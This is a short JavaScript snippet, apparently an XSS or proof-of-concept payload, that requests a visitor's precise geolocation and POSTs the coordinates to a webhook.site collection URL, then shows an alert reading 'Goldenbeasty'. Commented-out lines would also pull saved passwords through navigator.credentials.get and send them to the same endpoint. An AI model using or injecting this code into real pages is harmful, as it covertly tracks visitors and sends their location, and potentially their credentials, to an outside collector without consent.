async function main() {    
    var options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
    };

    function success(pos) {
        var crd = pos.coords;
        var data = [crd.latitude, crd.longitude, crd.accuracy];
        let xhr = new XMLHttpRequest();
        xhr.open("POST", url);
        xhr.send(data);
    }

    function error(err) {
        console.warn(`ERROR(${err.code}): ${err.message}`);
    }
    navigator.geolocation.getCurrentPosition(success, error, options);

    let url = 'https://webhook.site/75296190-1ddd-4656-9701-533fee9fa083';
    // let xhr = new XMLHttpRequest();
    // xhr.open("POST", url);
    // let bdata = navigator.credentials.get({password: true});
    // xhr.send(bdata);
    // console.log(bdata);
    alert('Goldenbeasty');
}
main()